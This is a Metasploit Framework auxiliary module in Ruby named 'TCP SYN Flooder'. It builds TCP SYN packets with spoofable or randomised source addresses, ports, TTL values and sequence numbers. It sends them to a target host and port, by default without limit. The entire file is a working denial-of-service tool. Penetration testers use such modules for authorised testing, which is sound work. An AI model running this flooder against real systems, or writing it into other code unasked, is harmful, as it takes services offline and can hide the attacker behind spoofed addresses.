##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'TCP SYN Flooder',
			'Description' => 'A simple TCP SYN flooder',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE
		)

		register_options([
			Opt::RPORT(80),
			OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
			OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
			OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
		])

		deregister_options('FILTER','PCAPFILE')
	end

	def sport
		datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
	end

	def rport
		datastore['RPORT'].to_i
	end

	def srchost
		datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
	end

	def run
		open_pcap

		sent = 0
		num = datastore['NUM']

		print_status("SYN flooding #{rhost}:#{rport}...")

		p = PacketFu::TCPPacket.new
		p.ip_saddr = srchost
		p.ip_daddr = rhost
		p.tcp_dport = rport
		p.tcp_flags.syn = 1

		while (num <= 0) or (sent < num)
			p.ip_ttl = rand(128)+128
			p.tcp_win = rand(4096)+1
			p.tcp_sport = sport
			p.tcp_seq = rand(0x100000000)
			p.recalc
			capture_sendto(p,rhost)
			sent += 1
		end

		close_pcap
	end
end
